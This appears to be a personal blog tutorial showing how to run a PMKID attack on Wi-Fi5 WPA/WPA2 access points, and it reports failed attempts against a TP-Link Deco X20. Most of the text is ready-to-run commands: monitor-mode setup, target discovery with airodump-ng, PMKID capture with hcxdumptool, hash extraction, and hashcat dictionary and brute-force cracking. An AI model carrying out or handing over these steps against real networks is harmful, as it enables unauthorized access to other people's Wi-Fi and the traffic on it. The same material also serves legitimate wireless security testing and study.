|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|

# **PMKID Attack on Wifi5 Access Point**

The [author of Hashcat (aka atom)](https://hashcat.net/forum/thread-7717.html) finds a way to obtain the WPA/WP2-PSK (Pre-shared key) password from Wifi5 Access Points (APs) without client involved.  That is 4-way handshake is no longer required.

However, this method does not work on [TP-Link Deco X20](https://www.tp-link.com/hk/home-networking/deco/deco-x20/?utm_medium=select-local) Mesh Wifi Router (Wifi6 with WPA3).  All known attack methods has been tried on the Deco X20 but failed including PMKID attack (tested on March 19, 2020) and [KR00K attack](https://github.com/hexway/r00kie-kr00kie)  (CVE-2019-15126) (tested on March 21, 2020).  KR00K attack fails as Deco X20 is using Qualcomm IPQ8070 chipset instead of Broadcom.  I think PMKID attack cannot be working on Wifi6 with WPA3 for other brand names too.

### Hardware

- [TP-Link Archer T4UHP AC1300 USB Adapter](https://www.tp-link.com/us/home-networking/usb-adapter/archer-t4uhp/)


The attack will be carry out on Kali Linux 2020.1a and you are required to install the following packages.

```bash
sudo apt install hcxtools hcxdumptool net-tools realtek-rtl88xxau-dkms
```

In order to get the mac address of the target Access Point (AP), you need to run the following commands.  The following commands can detect channel from 1 to 200.

```bash
sudo airmon-ng check kill

sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor

sudo airodump-ng wlan0 --channel 1-200
```

The target AP should be Wifi5 with WPA/WPA2.  Once you get the mac address of the target AP, you need to remove all the ```:``` from the address.  For example, from ```00:0a:95:9d:68:16``` to ```000a959d6816``` and save to a file namely ```ap.txt```.

To make sure the target AP is in the range of the attack.  CTRL-c to quit.

```bash
sudo hcxdumptool -o ap.pcapng -i wlan0 --filterlist=ap.txt --filtermode=2 --do_rcascan -c 36
```

When every thing is ready, we can scan the PMKID now.

```bash
sudo hcxdumptool -o ap.pcapng -i wlan0 --filterlist=ap.txt --filtermode=2 --enable_status=3 -c 36
```

When you see ```[FOUND PMKID]``` or/and ```[FOUND PMKID CLIENT-LESS]```, you can quit it with CTRL-c.

To obtain the PMKID from ap.pcapng.

```bash
sudo hcxpcaptool -z hashtocrack ap.pcapng
```

To crack the ```hashtocrack``` with hashcat by using dictionary.

```bash
sudo hashcat -m 16800 hashtocrack /usr/share/wordlist/rockyou.txt
```

or by using brute forcing.

```bash
sudo hashcat -m 16800 hashtocrack -a 3 -w 3 '?l?l?l?l?l?l?l?l'
```

When it is cracked, you can show the result by using the following command.

```bash
sudo hashcat -m 16800 hashtocrack /usr/share/wordlist/rockyou.txt --show
```

* You can use ```--force``` to override the issue of hashcat when necessary.

Samiux  
OSCE  OSCP  OSWP  
March 19, 2020, Hong Kong, China  
Updated on March 21, 2020, Hong Kong, China  

|[Home](/README.md)|[Projects](/projects.md)|[Articles](/articles.md)|[Apophthegm](/apophthegm.md)|[About](/about.md)|

